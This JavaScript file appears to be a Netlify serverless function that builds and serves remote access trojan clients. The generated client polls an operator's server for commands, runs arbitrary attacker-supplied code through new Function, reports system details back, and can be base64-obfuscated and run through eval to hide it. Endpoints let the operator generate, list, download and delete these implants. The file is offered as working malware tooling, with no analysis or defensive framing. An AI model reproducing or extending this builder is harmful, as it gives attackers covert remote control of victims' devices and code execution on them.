const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

// Simple in-memory storage for generated clients
let generatedClients = [];

// Builder class (simplified version)
class RatBuilder {
  constructor() {
    this.templates = ['basic', 'stealth', 'browser'];
  }

  generateClientId() {
    return `rat_${crypto.randomBytes(8).toString('hex')}`;
  }

  generateToken() {
    return crypto.randomBytes(32).toString('hex');
  }

  buildClient(options = {}) {
    const {
      template = 'basic',
      serverUrl,
      authToken,
      clientId = this.generateClientId(),
      obfuscate = true,
      persistence = false,
      name = 'rat_client'
    } = options;

    if (!serverUrl || !authToken) {
      throw new Error('serverUrl and authToken are required');
    }

    // Generate client code (simplified)
    const clientCode = this.generateClientCode({
      template,
      serverUrl,
      authToken,
      clientId,
      obfuscate,
      persistence
    });

    // Store client information
    const clientInfo = {
      id: crypto.randomUUID(),
      clientId: clientId,
      name: name,
      template: template,
      code: clientCode,
      timestamp: new Date().toISOString(),
      config: {
        serverUrl,
        template,
        obfuscate,
        persistence,
        buildTime: new Date().toISOString()
      }
    };

    generatedClients.push(clientInfo);

    return clientInfo;
  }

  generateClientCode(options) {
    const { template, serverUrl, authToken, clientId, obfuscate, persistence } = options;
    
    // Basic client template
    let code = `
// ${template.toUpperCase()} RAT Client
// Generated: ${new Date().toISOString()}
// Client ID: ${clientId}

(function() {
    'use strict';
    
    const CONFIG = {
        serverUrl: '${serverUrl}',
        authToken: '${authToken}',
        clientId: '${clientId}',
        heartbeatInterval: ${template === 'stealth' ? 30000 : 5000},
        maxRetries: 3,
        retryDelay: 10000
    };

    let isRunning = true;
    let retryCount = 0;

    async function httpRequest(url, options = {}) {
        const defaultOptions = {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
                'X-Client-ID': CONFIG.clientId,
                'Authorization': \`Bearer \${CONFIG.authToken}\`
            }
        };

        const finalOptions = { ...defaultOptions, ...options };

        try {
            const response = await fetch(url, finalOptions);
            if (!response.ok) {
                throw new Error(\`HTTP \${response.status}: \${response.statusText}\`);
            }
            return await response.json();
        } catch (error) {
            throw new Error(\`HTTP request failed: \${error.message}\`);
        }
    }

    async function executeCommand(command, parameters = {}) {
        console.log(\`[RAT] Executing: \${command}\`);
        
        let result = null;
        let error = null;

        try {
            switch (command) {
                case 'system_info':
                    result = {
                        platform: typeof navigator !== 'undefined' ? navigator.platform : process.platform,
                        userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Node.js',
                        language: typeof navigator !== 'undefined' ? navigator.language : 'en',
                        timestamp: Date.now(),
                        clientId: CONFIG.clientId
                    };
                    break;

                case 'ping':
                    result = { 
                        pong: Date.now(), 
                        clientId: CONFIG.clientId,
                        uptime: typeof process !== 'undefined' ? process.uptime() : 0
                    };
                    break;

                case 'screenshot':
                    result = { 
                        status: 'screenshot_requested',
                        note: 'Screenshot capture requires additional libraries'
                    };
                    break;

                case 'custom_script':
                    if (parameters.code) {
                        try {
                            const func = new Function('params', parameters.code);
                            result = func(parameters);
                        } catch (e) {
                            error = \`Script execution failed: \${e.message}\`;
                        }
                    } else {
                        error = 'No code provided';
                    }
                    break;

                case 'shutdown':
                    result = { status: 'shutting_down' };
                    isRunning = false;
                    break;

                default:
                    error = \`Unknown command: \${command}\`;
            }
        } catch (e) {
            error = \`Command execution failed: \${e.message}\`;
        }

        return { result, error, commandId: lastCommandId };
    }

    async function sendResponse(responseData) {
        try {
            const response = await httpRequest(
                \`\${CONFIG.serverUrl}/.netlify/functions/response\`,
                {
                    method: 'POST',
                    body: JSON.stringify(responseData)
                }
            );
            console.log('[RAT] Response sent successfully');
            return response;
        } catch (error) {
            console.error('[RAT] Failed to send response:', error.message);
            throw error;
        }
    }

    async function heartbeat() {
        try {
            const response = await httpRequest(
                \`\${CONFIG.serverUrl}/.netlify/functions/heartbeat\`
            );

            if (response.status === 'command_pending') {
                console.log('[RAT] Received command:', response.command);
                lastCommandId = response.command.id;
                
                const result = await executeCommand(
                    response.command.command, 
                    response.command.parameters
                );
                
                await sendResponse(result);
            } else {
                console.log('[RAT] Heartbeat acknowledged');
            }

            retryCount = 0;
            return response;
        } catch (error) {
            console.error('[RAT] Heartbeat failed:', error.message);
            retryCount++;
            
            if (retryCount >= CONFIG.maxRetries) {
                console.error('[RAT] Max retries reached, stopping');
                isRunning = false;
            }
            
            throw error;
        }
    }

    async function start() {
        console.log(\`[RAT] Client starting...\`);
        console.log(\`[RAT] Client ID: \${CONFIG.clientId}\`);
        console.log(\`[RAT] Server: \${CONFIG.serverUrl}\`);
        
        while (isRunning) {
            try {
                await heartbeat();
                await new Promise(resolve => setTimeout(resolve, CONFIG.heartbeatInterval));
            } catch (error) {
                console.error('[RAT] Main loop error:', error.message);
                await new Promise(resolve => setTimeout(resolve, CONFIG.retryDelay));
            }
        }

        console.log('[RAT] Client stopped');
    }

    // Start the client
    start();
})();
`;

    // Add obfuscation if requested
    if (obfuscate) {
      code = Buffer.from(code).toString('base64');
      code = `
// Obfuscated client - requires deobfuscation
(function() {
    const obfuscatedCode = '${code}';
    const deobfuscated = atob(obfuscatedCode);
    eval(deobfuscated);
})();
`;
    }

    return code;
  }

  listClients() {
    return generatedClients.map(client => ({
      id: client.id,
      clientId: client.clientId,
      name: client.name,
      template: client.template,
      timestamp: client.timestamp,
      config: client.config
    }));
  }

  getClient(id) {
    return generatedClients.find(client => client.id === id);
  }

  deleteClient(id) {
    const index = generatedClients.findIndex(client => client.id === id);
    if (index !== -1) {
      return generatedClients.splice(index, 1)[0];
    }
    return null;
  }
}

const builder = new RatBuilder();

exports.handler = async (event, context) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
    'Content-Type': 'application/json'
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  try {
    const path = event.path.replace('/.netlify/functions/builder', '').replace(/^\/+/, '');
    const method = event.httpMethod;

    if (method === 'GET' && path === '') {
      // List all clients
      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({
          clients: builder.listClients(),
          timestamp: new Date().toISOString()
        })
      };
    }

    if (method === 'POST' && path === 'generate') {
      // Generate a new client
      const body = JSON.parse(event.body);
      const client = builder.buildClient(body);
      
      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({
          success: true,
          client: {
            id: client.id,
            clientId: client.clientId,
            name: client.name,
            template: client.template,
            timestamp: client.timestamp,
            config: client.config
          }
        })
      };
    }

    if (method === 'GET' && path.startsWith('download/')) {
      // Download client code
      const clientId = path.replace('download/', '');
      const client = builder.getClient(clientId);
      
      if (!client) {
        return {
          statusCode: 404,
          headers,
          body: JSON.stringify({ error: 'Client not found' })
        };
      }

      return {
        statusCode: 200,
        headers: {
          ...headers,
          'Content-Type': 'application/javascript',
          'Content-Disposition': `attachment; filename="${client.name}.js"`
        },
        body: client.code
      };
    }

    if (method === 'DELETE' && path.startsWith('delete/')) {
      // Delete a client
      const clientId = path.replace('delete/', '');
      const deleted = builder.deleteClient(clientId);
      
      if (!deleted) {
        return {
          statusCode: 404,
          headers,
          body: JSON.stringify({ error: 'Client not found' })
        };
      }

      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({
          success: true,
          message: 'Client deleted successfully'
        })
      };
    }

    return {
      statusCode: 404,
      headers,
      body: JSON.stringify({ error: 'Endpoint not found' })
    };

  } catch (error) {
    console.error('Builder function error:', error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: 'Internal server error',
        message: error.message
      })
    };
  }
};
